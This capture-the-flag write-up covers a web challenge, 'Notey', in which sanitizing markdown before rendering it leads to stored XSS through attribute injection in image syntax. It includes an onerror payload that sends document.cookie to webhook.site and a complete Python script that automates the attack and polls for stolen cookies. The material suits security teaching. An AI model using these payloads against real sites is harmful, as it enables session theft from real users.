# Notey Write-up

## Challenge Info

- **Name:** Notey  
- **Category:** Web  
- **Difficulty:** Easy  
- **Instance:** http://ctf.vulnbydefault.com:36760  
- **Flag format:** VBD{…}

---

## TL;DR

The application sanitizes markdown before converting it to HTML.  
However, the markdown renderer (`slimdown-js`) inserts URL content into HTML attributes without escaping quotes.

This allows attribute injection via markdown image syntax:

```
![x](x" onerror="location='https://webhook.site/?c='+document.cookie")
```

When the admin bot visits the note, the `onerror` executes and exfiltrates cookies (including the flag).

---

## Root Cause Analysis

### 1. Wrong sanitization order

- Input markdown is sanitized using DOMPurify
- Then converted into HTML using slimdown-js

This is unsafe because sanitization happens **before** rendering.

---

### 2. Vulnerable markdown parser

The parser converts:

```
![alt](url)
```

Into:

```html
<img src="$2" alt="$1">
```

The URL is inserted directly into `src` without escaping quotes.

This allows breaking out of the attribute and injecting new ones like `onerror`.

---

### 3. Admin bot with sensitive cookies

The endpoint `/api/visit` triggers a Puppeteer bot that:

- Sets a **flag cookie** (not HttpOnly)
- Sets an admin session cookie
- Visits attacker-controlled content

This allows stealing cookies via XSS.

---

## Exploitation Steps

1. Create attacker account:
   - `/api/auth/signup`
   - `/api/auth/signin`

2. Generate webhook:
   - `POST https://webhook.site/token`

3. Create malicious note with payload

4. Trigger bot:
   - `POST /api/visit`

5. Poll webhook:
   - `GET https://webhook.site/token/<uuid>/requests`

6. Extract flag from cookie

---

## Exploit Script

```python
import json
import re
import secrets
import string
import time
import requests

BASE = "http://ctf.vulnbydefault.com:36760"

s = requests.Session()

def rand(n=8):
    return ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def must(cond, msg):
    if not cond:
        raise RuntimeError(msg)

username = f"u_{rand()}"
password = f"P_{rand(12)}"

print(f"[*] Target: {BASE}")
print(f"[*] User: {username}")

# signup
r = s.post(f"{BASE}/api/auth/signup", json={"username": username, "password": password})
r.raise_for_status()

# signin
r = s.post(f"{BASE}/api/auth/signin", json={"username": username, "password": password})
r.raise_for_status()

attacker_token = s.cookies.get("session")
must(attacker_token, "No session cookie")

# webhook
wr = requests.post("https://webhook.site/token")
wr.raise_for_status()

token = wr.json()["uuid"]
hook_url = f"https://webhook.site/{token}"

# payload
payload = f"![x](x\" onerror=\"location='{hook_url}?c='+document.cookie\")"

# create note
r = s.post(f"{BASE}/api/notes", json={"title": "xss", "content": payload})
note_id = r.json().get("id")

# trigger bot
s.post(f"{BASE}/api/visit", data={"noteId": note_id})

# poll webhook
flag = None
for _ in range(20):
    time.sleep(2)
    lr = requests.get(f"https://webhook.site/token/{token}/requests")
    data = lr.json().get("data", [])

    for req in data:
        query = req.get("query", {})
        c = query.get("c")
        if c:
            m = re.search(r"VBD\{[^}]+\}", c)
            if m:
                flag = m.group(0)
                break

    if flag:
        break

print(f"[FLAG] {flag}")
```

---

## Flag

```
VBD{m4rkd0wn_1s_n0t_s3cur3_f031aa747dafeb8c6d39b8b6caf4a72b}
```

---

Thanks for reading and happy hacking!

